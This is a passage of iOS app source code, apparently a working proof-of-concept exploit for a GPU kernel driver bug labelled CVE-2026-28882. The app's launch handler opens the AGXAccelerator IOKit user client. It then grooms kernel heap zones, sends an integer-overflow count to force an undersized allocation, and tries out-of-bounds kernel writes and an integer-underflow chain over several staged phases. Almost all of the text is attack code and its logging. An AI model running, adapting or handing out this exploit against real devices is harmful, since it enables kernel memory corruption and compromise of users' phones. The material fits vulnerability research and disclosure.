         * sel=7 baseline returns kr=0 on valid groups. Try calling it many times
         * to see if it decrements an internal counter. */
        /* Create a fresh count=0 group */
        uint64_t g0 = try_sgar_q(conn, 0);
        evf("[P6] G0 (count=0): gid=0x%llx", g0);
        if (!g0) { evf("[P6] ABORT: cannot create G0"); return; }
        /* Call sel=7 100 times on G0 */
        int ok7 = 0;
        for (int i = 0; i < 100; i++) {
            kern_return_t r7 = try_sel7_q(conn, (uint32_t)g0);
            if (r7 == 0) ok7++;
        }
        evf("[P6] SEL7 x100 on G0: %d/100 kr=0", ok7);
        return;
    }

    /* Phase 6c: F-109 integer underflow chain */
    evf("[P6] REMOVE selector found: sel=%d — attempting integer underflow", remove_sel);

    /* Groom: create 512 count=15 groups to fill kalloc_type_var with
     * elements that have 0x0000000F at bytes [12..15] */
    uint32_t groom6[512];
    int g6_valid = 0;
    for (int gi = 0; gi < 512; gi++) {
        uint64_t g = try_sgar_q(conn, 15);
        if (g) groom6[g6_valid++] = (uint32_t)g;
    }
    evf("[P6] GROOM: %d/512 count=15 groups (kalloc_type_var)", g6_valid);

    /* Create a count=0 target group (G_zero), then remove 1 -> COUNT=-1 */
    uint64_t g_zero = try_sgar_q(conn, 0);
    evf("[P6] G_ZERO (count=0): gid=0x%llx", g_zero);
    if (!g_zero) { evf("[P6] ABORT: cannot create G_ZERO"); return; }

    /* Remove count=1 from G_ZERO (which has 0 resources) -> integer underflow to -1 */
    static uint8_t rm_s[SGAR_STRUCT_SIZE];
    uint8_t rm_out[0x10]; size_t rm_out_sz = sizeof(rm_out); uint32_t rm_cnt = 0;
    memset(rm_s, 0, sizeof(rm_s));
    *(uint32_t *)(rm_s + 0x00) = (uint32_t)g_zero;
    *(uint32_t *)(rm_s + 0x04) = (uint32_t)(g_zero >> 32);
    *(uint32_t *)(rm_s + 0x20) = 1;  /* remove count=1 */
    *(uint32_t *)(rm_s + 0x28) = 0x1000;  /* dummy handle */
    kern_return_t rm_kr = IOConnectCallMethod(conn, remove_sel,
        NULL, 0, rm_s, sizeof(rm_s), NULL, &rm_cnt, rm_out, &rm_out_sz);
    evf("[P6] REMOVE(G_ZERO, count=1) kr=0x%x -> COUNT should be -1", rm_kr);

    /* Now call ADD(G_ZERO, count=1) again to trigger repack with COUNT=-1 */
    static uint8_t add2_s[SGAR_STRUCT_SIZE];
    uint8_t add2_out[0x10]; size_t add2_out_sz = sizeof(add2_out); uint32_t add2_cnt = 0;
    memset(add2_s, 0, sizeof(add2_s));
    *(uint32_t *)(add2_s + 0x00) = (uint32_t)g_zero;   /* existing group_id */
    *(uint32_t *)(add2_s + 0x04) = (uint32_t)(g_zero >> 32);
    *(uint32_t *)(add2_s + SGAR_COUNT_OFFSET) = 1;     /* add 1 resource */
    *(uint32_t *)(add2_s + 0x28) = 0x2000;             /* resource handle */
    kern_return_t add2_kr = IOConnectCallMethod(conn, SGAR_SELECTOR,
        NULL, 0, add2_s, sizeof(add2_s), NULL, &add2_cnt, add2_out, &add2_out_sz);
    evf("[P6] ADD(G_ZERO, count=1) -> REPACK trigger: kr=0x%x", add2_kr);

    evf("[P6] DONE — if panic with GPR=0x%016llx: F-109 chain confirmed -> F-74", COMMPAGE_FLAG);
}

static void trigger_bof_iokit(void) {
    evf("[BOF] IOKIT_START sel=%d struct=0x%x count_off=0x%x",
        SGAR_SELECTOR, SGAR_STRUCT_SIZE, SGAR_COUNT_OFFSET);

    mach_port_t master = 0;
    IOMasterPort(MACH_PORT_NULL, &master);

    /* Open AGXAcceleratorG18P type=1 (IOGPUDeviceUserClient) */
    io_connect_t conn = 0;
    const char *svc_try[] = { "AGXAcceleratorG18P", "IOGPU", "AGXAccelerator", NULL };
    for (int si = 0; svc_try[si] && !conn; si++) {
        CFMutableDictionaryRef match = IOServiceMatching(svc_try[si]);
        io_iterator_t it = 0;
        IOServiceGetMatchingServices(master, match, &it);
        io_service_t svc = IOIteratorNext(it);
        IOObjectRelease(it);
        if (!svc) continue;

        kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 1, &conn);
        IOObjectRelease(svc);
        if (kr == 0 && conn)
            evf("[BOF] OPEN %s type=1 conn=0x%x OK", svc_try[si], conn);
        else
            evf("[BOF] OPEN %s type=1 FAIL kr=0x%x", svc_try[si], kr);
    }

    if (!conn) {
        evf("[BOF] NO_CONN: cannot open IOGPUDeviceUserClient");
        return;
    }

    /* Baseline groups */
    uint64_t base_gid = try_sgar(conn, 4, "BASELINE_4");

    /* Create OVERFLOW group: count=0x80000000 → 32-bit mul truncation → 8-byte alloc
     * alloc_size = (0x80000000 * 24) mod 2^32 + 8 = 0 + 8 = 8 bytes
     * group is registered with count=0x80000000 in its metadata */
    uint64_t ovf_gid = try_sgar(conn, 0x80000000u, "OVERFLOW_INT32MIN");

    /* Phase 2: OOB write proof — fill resource entry section with non-zero handle (1).
     * SGAR always creates new group. OOB happens when kernel copies resource
     * entries from struct[0x28..] into the 8-byte undersized allocation.
     * With count=0x80000000: alloc=8 bytes, but ~125/41 entries available → OOB.
     * Test three entry sizes to find the actual format used by the kernel. */

    /* Test A: uint32_t entries (4-byte handles) at [+0x28], ~250 entries */
    {
        static uint8_t oob_s[SGAR_STRUCT_SIZE];
        uint8_t oob_out[0x10]; size_t oob_out_sz = sizeof(oob_out); uint32_t oob_cnt = 0;
        memset(oob_s, 0, sizeof(oob_s));
        *(uint32_t *)(oob_s + SGAR_COUNT_OFFSET) = 0x80000000u;
        for (uint32_t off = 0x28; off + 4 <= SGAR_STRUCT_SIZE; off += 4)
            *(uint32_t *)(oob_s + off) = 0x00000001u;
        kern_return_t okr = IOConnectCallMethod(conn, SGAR_SELECTOR,
            NULL, 0, oob_s, sizeof(oob_s), NULL, &oob_cnt, oob_out, &oob_out_sz);
        evf("[BOF] OOB_4B count=0x80000000 entries@0x28=0x1 kr=0x%x", okr);
        if (okr == 0) {
            uint64_t gid = *(uint64_t *)oob_out;
            evf("[BOF] OOB_4B SUCCESS gid=0x%llx: kernel wrote non-zero entries to 8-byte alloc OOB CONFIRMED", gid);
        }
    }

    /* Test B: uint64_t entries (8-byte handles) at [+0x28], ~125 entries */
    {
        static uint8_t oob_s[SGAR_STRUCT_SIZE];
        uint8_t oob_out[0x10]; size_t oob_out_sz = sizeof(oob_out); uint32_t oob_cnt = 0;
        memset(oob_s, 0, sizeof(oob_s));
        *(uint32_t *)(oob_s + SGAR_COUNT_OFFSET) = 0x80000000u;
        for (uint32_t off = 0x28; off + 8 <= SGAR_STRUCT_SIZE; off += 8)
            *(uint64_t *)(oob_s + off) = 0x0000000000000001ull;
        kern_return_t okr = IOConnectCallMethod(conn, SGAR_SELECTOR,
            NULL, 0, oob_s, sizeof(oob_s), NULL, &oob_cnt, oob_out, &oob_out_sz);
        evf("[BOF] OOB_8B count=0x80000000 entries@0x28=0x1 kr=0x%x", okr);
        if (okr == 0) {
            uint64_t gid = *(uint64_t *)oob_out;
            evf("[BOF] OOB_8B SUCCESS gid=0x%llx: OOB WRITE CONFIRMED (8-byte entry format)", gid);
        }
    }

    /* Test C: 24-byte structs at [+0x28], ~41 entries; first field = handle */
    {
        static uint8_t oob_s[SGAR_STRUCT_SIZE];
        uint8_t oob_out[0x10]; size_t oob_out_sz = sizeof(oob_out); uint32_t oob_cnt = 0;
        memset(oob_s, 0, sizeof(oob_s));
        *(uint32_t *)(oob_s + SGAR_COUNT_OFFSET) = 0x80000000u;
        for (uint32_t off = 0x28; off + 24 <= SGAR_STRUCT_SIZE; off += 24)
            *(uint32_t *)(oob_s + off) = 0x00000001u;
        kern_return_t okr = IOConnectCallMethod(conn, SGAR_SELECTOR,
            NULL, 0, oob_s, sizeof(oob_s), NULL, &oob_cnt, oob_out, &oob_out_sz);
        evf("[BOF] OOB_24B count=0x80000000 entries@0x28=0x1 kr=0x%x", okr);
        if (okr == 0) {
            uint64_t gid = *(uint64_t *)oob_out;
            evf("[BOF] OOB_24B SUCCESS gid=0x%llx: OOB WRITE CONFIRMED (24-byte entry format)", gid);
        }
    }

    /* Phase 3: trigger lifecycle via sel=7 on overflow group */
    if (ovf_gid) {
        evf("[BOF] SEL7 on overflow group_id=0x%llx", ovf_gid);
        try_sel7(conn, (uint32_t)ovf_gid, "SEL7_OVERFLOW");
    }

    IOServiceClose(conn);
    evf("[BOF] IOKIT_DONE");
}

/* App entry point — called from application:didFinishLaunchingWithOptions: */
void run_cve28882_poc(UIWindow *window) {
    /* File logging to Documents/bof_log.txt for HouseArrest retrieval */
    NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *logPath = [[paths firstObject] stringByAppendingPathComponent:@"bof_log.txt"];
    g_bof_log = fopen([logPath UTF8String], "w");
    evf("BOF_START CVE-2026-28882 path=%s", [logPath UTF8String]);

    /* Setup WKWebView for XHR reporting */
    WKWebViewConfiguration *cfg = [[WKWebViewConfiguration alloc] init];
    g_wv = [[WKWebView alloc] initWithFrame:window.bounds configuration:cfg];
    [window addSubview:g_wv];
    [g_wv loadRequest:[NSURLRequest requestWithURL:
        [NSURL URLWithString:@"about:blank"]]];

    /* Wait for WebView */
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 2*NSEC_PER_SEC),
                   dispatch_get_main_queue(), ^{

        id<MTLDevice> dev = MTLCreateSystemDefaultDevice();
        if (!dev) {
            report("MTLCreateSystemDefaultDevice failed");
            return;
        }
        evf("Device: %s", dev.name.UTF8String);

        /* Phase 1: Spray canaries */
        spray_canaries(dev);

        /* Phase 2: Raw IOUserClient probe — OOB write baseline */
        trigger_bof_iokit();

        /* Phase 3: Metal API baseline (no overflow — Metal caps count) */
        trigger_bof(dev);

        /* Phase 4: MTLBuffer canary check (note: not in kalloc.8, informational only) */
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 1*NSEC_PER_SEC),
                       dispatch_get_main_queue(), ^{
            int corrupt = check_canaries();
            if (corrupt > 0) {
                evf("MTL_CANARY corrupt=%d (note: not kalloc.8, different zone)", corrupt);
            } else {
                evf("MTL_CANARY: intact (expected — MTLBuffer not in kalloc.8)");
            }
        });

        /* Phase 4 (SGAR groom+corrupt+trigger): needs fresh connection */
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 3*NSEC_PER_SEC),
                       dispatch_get_main_queue(), ^{
            mach_port_t mp4 = 0;
            IOMasterPort(MACH_PORT_NULL, &mp4);
            io_connect_t conn4 = 0;
            const char *svc4[] = { "AGXAcceleratorG18P", "IOGPU", "AGXAccelerator", NULL };
            for (int si = 0; svc4[si] && !conn4; si++) {
                CFMutableDictionaryRef m4 = IOServiceMatching(svc4[si]);
                io_iterator_t it4 = 0;
                IOServiceGetMatchingServices(mp4, m4, &it4);
                io_service_t sv4 = IOIteratorNext(it4);
                IOObjectRelease(it4);
                if (!sv4) continue;
                kern_return_t kr4 = IOServiceOpen(sv4, mach_task_self(), 1, &conn4);
                IOObjectRelease(sv4);
                if (kr4 != 0) conn4 = 0;
            }
            if (conn4) {
                evf("[P4] CONN4 ready=0x%x", conn4);
                trigger_phase4(conn4);
                IOServiceClose(conn4);
                evf("[P4] CONN4 closed");
            } else {
                evf("[P4] CONN4 failed: cannot open for Phase 4");
            }

            /* Phase 5: F-109 backward OOB (count=0xFFFFFFFF -> kalloc_type_var write) */
            dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 3*NSEC_PER_SEC),
                           dispatch_get_main_queue(), ^{
                mach_port_t mp5 = 0;
                IOMasterPort(MACH_PORT_NULL, &mp5);
                io_connect_t conn5 = 0;
                const char *svc5[] = { "AGXAcceleratorG18P", "IOGPU", "AGXAccelerator", NULL };
                for (int si = 0; svc5[si] && !conn5; si++) {
                    CFMutableDictionaryRef m5 = IOServiceMatching(svc5[si]);
                    io_iterator_t it5 = 0;
                    IOServiceGetMatchingServices(mp5, m5, &it5);
                    io_service_t sv5 = IOIteratorNext(it5);
                    IOObjectRelease(it5);
                    if (!sv5) continue;
                    kern_return_t kr5 = IOServiceOpen(sv5, mach_task_self(), 1, &conn5);
                    IOObjectRelease(sv5);
                    if (kr5 != 0) conn5 = 0;
                }
                if (conn5) {
                    evf("[P5] CONN5 ready=0x%x", conn5);
                    trigger_phase5(conn5);
                    IOServiceClose(conn5);
                    evf("[P5] CONN5 closed");

                    /* Phase 6: F-109 integer underflow via selector probe */
                    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 3*NSEC_PER_SEC),
                                   dispatch_get_main_queue(), ^{
                        mach_port_t mp6 = 0;
                        IOMasterPort(MACH_PORT_NULL, &mp6);
                        io_connect_t conn6 = 0;
                        const char *svc6[] = { "AGXAcceleratorG18P", "IOGPU", "AGXAccelerator", NULL };
                        for (int si6 = 0; svc6[si6] && !conn6; si6++) {
                            io_service_t svc6s = IOServiceGetMatchingService(
                                kIOMainPortDefault, IOServiceMatching(svc6[si6]));
                            if (svc6s) {
                                IOServiceOpen(svc6s, mach_task_self(), 1, &conn6);
                                IOObjectRelease(svc6s);
                            }
                        }
                        if (conn6) {
                            evf("[P6] CONN6 ready=0x%x", conn6);
                            trigger_phase6(conn6);
                            IOServiceClose(conn6);
                            evf("[P6] CONN6 closed");
                        } else {
                            evf("[P6] CONN6 failed: cannot open for Phase 6");
                        }
                    });
                } else {
                    evf("[P5] CONN5 failed: cannot open for Phase 5");
                }
            });
        });
    });
}

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (strong, nonatomic) UIWindow *window;
@end

@interface RootVC : UIViewController
@end
@implementation RootVC
@end

@implementation AppDelegate
- (BOOL)application:(UIApplication *)application
    didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
    self.window = [[UIWindow alloc] initWithFrame:[[UIScreen mainScreen] bounds]];
    self.window.rootViewController = [[RootVC alloc] init];
    self.window.backgroundColor = [UIColor blackColor];
    [self.window makeKeyAndVisible];
    run_cve28882_poc(self.window);
    return YES;
}
@end

int main(int argc, char *argv[]) {
    @autoreleasepool {
        return UIApplicationMain(argc, argv, nil,
            NSStringFromClass([AppDelegate class]));
    }
}
